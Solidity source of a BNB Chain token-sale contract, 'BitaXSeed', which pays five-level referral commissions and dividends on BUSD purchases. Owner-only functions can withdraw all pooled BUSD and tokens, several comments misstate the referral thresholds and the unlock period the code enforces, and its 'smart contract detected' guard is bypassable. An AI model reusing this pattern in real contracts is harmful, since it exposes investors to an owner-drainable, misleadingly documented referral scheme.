/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract BitaXSeed {
    using SafeMath for uint256;

    BEP20 public bitaX = BEP20(0x3AD53Eb310bC6061baa62D900E6953601Dc90E5c);  // BitaX 
    BEP20 public busd = BEP20(0xDc6cc6d847DF088C3eEDA72404864B59c0cD53B2);  // BUSD
    
    address payable liquidator;
    uint8 [5] public referral = [5,3,2,1,1];
    uint8 public dividend = 5;
    uint256 public fixedAmt = 10e18;
    uint256 public price = 5;
    uint256 public tokenSold;
    uint256 public currentSupply = 5000;
    uint256 public timeStep = 10 minutes; // 30 days
    uint16 public maxReturns = 10;
    uint16 public totalReturns = 150;
    uint16 public tokenLimit = 100;
    struct User{
        address refer;
        bool isActive;
        bool prequal;
        uint256 tokens;
        uint256 stakedTokens;
        uint256 released;
        mapping(uint256 => uint256) commission;
        mapping(uint256 => uint256) levelTeam;
        mapping(uint256 => uint256) dividend;
        uint256 lastUnlocked;
    }

    struct Deposit{
        uint256 busd;
        uint256 token;
        uint256 nof;
        uint256 uptoMonth;
        uint256 deptime;
    }

    struct Withdraw{
        uint256 token;
        uint256 paidtime;
    }

    struct Unlock{
        uint256 token;
        uint256 unlocktime;
    }

    mapping (address => User) public users;
    mapping (address => Deposit []) public deposits;
    mapping (address => Withdraw []) public withdraws;
    mapping (address => Unlock []) public unlocks;
  

    event Register(address user, address refer);
    event Sold(address buyer, uint256 busd, uint256 token);
    event Payout(address buyer, uint256 token);
    event UnLock(address buyer, uint256 token);
   
    modifier onlyLiquidator(){
        require(msg.sender == liquidator,"You are not authorized liquidator.");
        _;
    }

    modifier security {
        uint size;
        address sandbox = msg.sender;
        assembly { size := extcodesize(sandbox) }
        require(size == 0, "Smart contract detected!");
        _;
    }

    function getBalanceSheet() view public returns(uint256 contractTokenBalance, uint256 contractTokenSold,uint256 contractBusdBalance){
        return (
            contractTokenBalance = bitaX.balanceOf(address(this)),
            contractTokenSold = tokenSold,
            contractBusdBalance = busd.balanceOf(address(this))
        );
    }

    constructor() public {
        liquidator = msg.sender;
        users[liquidator].isActive = true;
    }

    function register(address _refer) public security{
        require(users[msg.sender].isActive==false,"You are already registered.");
        require(users[_refer].isActive==true && _refer!=msg.sender,"Invalid Referer!");
        _register(msg.sender, _refer);
    }

    function _register(address buyer, address _refer) internal {
        busd.transferFrom(msg.sender,address(this),fixedAmt);
        uint256 scaledAmount = fixedAmt.mul(price).div(10);
        require(currentSupply >= scaledAmount.div(1e18));
        users[msg.sender].isActive = true;
        tokenSold += scaledAmount.div(1e18);
        if(buyer!=liquidator){
            if(users[buyer].refer==address(0x0)){
                setReferral(buyer,_refer);
            }
            distributeReferral(buyer, scaledAmount, true);
        }
        deposits[buyer].push(Deposit(
            fixedAmt,
            scaledAmount,
            1,
            5,
            block.timestamp
        ));

        emit Register(buyer, _refer);
        emit Sold(buyer, fixedAmt, scaledAmount);
        
    }

    function setReferral(address direct, address refer) internal{
        users[direct].refer = refer;
        for(uint8 i=0; i<referral.length; i++){
            users[users[direct].refer].levelTeam[i]++;
            direct = users[direct].refer;
            if(users[direct].refer==address(0x0)) break;
        }
    }

    function distributeReferral(address direct, uint256 _bitaX, bool isReg) internal{
        for(uint8 i=0; i<referral.length; i++){
            users[users[direct].refer].commission[i]+=_bitaX.mul(referral[i]).div(100);
            if(isReg==true){
                if(i == 0 && users[users[direct].refer].levelTeam[0] >= 2 && users[users[direct].refer].dividend[0]==0){ // Minimum 10 directs
                    users[users[direct].refer].dividend[0]=25e17;
                }
                else if(i == 1 && users[users[direct].refer].levelTeam[1] >= 4 && users[users[direct].refer].dividend[1]==0){ // Minimum 50 members at level 2
                    users[users[direct].refer].dividend[1]=125e17;
                }
                else if(i == 2 && users[users[direct].refer].levelTeam[2] >= 6 && users[users[direct].refer].dividend[2]==0){ // Minimum 200 members at level 3
                    users[users[direct].refer].dividend[2]=50e18;
                }
                else if(i == 3 && users[users[direct].refer].levelTeam[3] >= 8 && users[users[direct].refer].dividend[3]==0){ // Minimum 500 members at level 4
                    users[users[direct].refer].dividend[3]=125e18;
                }
                else if(i == 4 && users[users[direct].refer].levelTeam[4] >= 10 && users[users[direct].refer].dividend[4]==0){ // Minimum 1000 members at level 5
                    users[users[direct].refer].dividend[4]=250e18;
                }
            }
            direct = users[direct].refer;
            if(users[direct].refer==address(0x0)) break;
        }
    }

    function buy() public security{
        User storage user = users[msg.sender];
        require(user.isActive==true,"Please register first!");
        if(user.prequal==false){
            require(user.levelTeam[0]>=2,"Minimum 10 directs needed.");
        }
        require(deposits[msg.sender].length<2,"Sorry! your buy limit is over.");
        _buy(msg.sender, 200e18);
    }

    function _buy(address buyer, uint256 _busd) internal {
        busd.transferFrom(msg.sender,address(this),_busd);
        uint256 scaledAmount = _busd.mul(price).div(10);
        require(currentSupply >= scaledAmount.div(1e18));
        tokenSold += scaledAmount.div(1e18);
        if(buyer!=liquidator){
            distributeReferral(buyer, scaledAmount, false);
        }
        deposits[buyer].push(Deposit(
            _busd,
            scaledAmount,
            5,
            30,
            block.timestamp
        ));
        users[msg.sender].stakedTokens+=scaledAmount.div(1e18);
        users[msg.sender].tokens+=scaledAmount.mul(totalReturns).div(100);
        emit Sold(buyer, _busd, scaledAmount);
    }

    function recursion(address qual)external onlyLiquidator security{
        users[qual].prequal = true;
    }
    
    function userDetails(address user)public view returns(uint256 [5] memory members, uint256 [5] memory commission, uint256 [5] memory dividends, uint256 deposit, uint256 payout, uint256 unlock){
        for(uint8 i = 0; i < referral.length; i++){
            members[i] = users[user].levelTeam[i];
            commission[i] = users[user].commission[i];
            dividends[i] = users[user].dividend[i];
        }
        deposit = deposits[user].length;
        payout = withdraws[user].length;
        unlock = withdraws[user].length;
        return (members, commission, dividends, deposit, payout, unlock);
    }

    function earnings(address buyer) public view returns(uint256 income){
        User storage user = users[buyer];
        for(uint8 i = 0; i < referral.length; i++){
            income+=user.dividend[i].add(user.commission[i]);
        }
        return income;
    }

    function getReturnsInfo(address buyer) public view returns(uint256 roi, bool status){
        bool isLocked = false;
        uint256 amount = users[buyer].tokens.sub(users[buyer].released);
        if(users[buyer].lastUnlocked+timeStep>block.timestamp){
            isLocked = true;
        }
        return (amount.mul(maxReturns).div(100), isLocked);
    }

    function getRoiInfo(address buyer) public view returns(uint256 roi){
        uint256 myRoi;
        for(uint i=0;i<deposits[buyer].length;i++){
            Deposit storage pl = deposits[buyer][i];
            if(block.timestamp>pl.deptime){
                uint256 totalDays=getCurDay(pl.deptime);
                if(i==0){
                    if(totalDays>=5){totalDays=5;}
                }else if(i==1){
                    if(totalDays>=30){totalDays=30;}
                }
                myRoi+=pl.nof.mul(totalDays);
            }
        }
        return (myRoi);
    }

    function unlock() public security{
        User storage user = users[msg.sender];
        require(user.isActive==true,"You are not activated.");
        uint256 myRoi;
        for(uint i=0;i<deposits[msg.sender].length;i++){
            Deposit storage pl = deposits[msg.sender][i];
            if(block.timestamp>pl.deptime){
                uint256 totalDays=getCurDay(pl.deptime);
                if(i==0){
                    if(totalDays>=5){totalDays=5;}
                }else if(i==1){
                    if(totalDays>=30){totalDays=30;}
                }
                myRoi+=pl.nof.mul(totalDays);
            }
        }
        uint256 amount = myRoi.mul(1e18).sub(user.released);
        require(amount>=1e18,"Minimum 1 token withdraw.");
        bitaX.transfer(msg.sender,amount);
        user.released+=amount;
        user.lastUnlocked = block.timestamp;
        unlocks[msg.sender].push(Unlock(
            amount,
            block.timestamp
        ));
    }

    function withdraw() public security{
        User storage user = users[msg.sender];
        require(user.isActive==true,"You are not activated.");
        uint256 total = earnings(msg.sender);
        
        bitaX.transfer(msg.sender,total);
        for(uint8 i = 0; i < referral.length; i++){
            user.dividend[i] = 0;
            user.commission[i] = 0;
        }
        withdraws[msg.sender].push(Withdraw(
            total,
            block.timestamp
        ));
    }

    function releaseLiquidityFund(address _liquidator, uint _amount) external onlyLiquidator security{
        busd.transfer(_liquidator,_amount);
    }
   
    function releaseTokenAndCloseICO(address _liquidator,uint _amount) external onlyLiquidator security{
        bitaX.transfer(_liquidator,_amount);
        tokenSold += _amount.div(1e18);
    }

    function getCurDay(uint256 startTime) public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}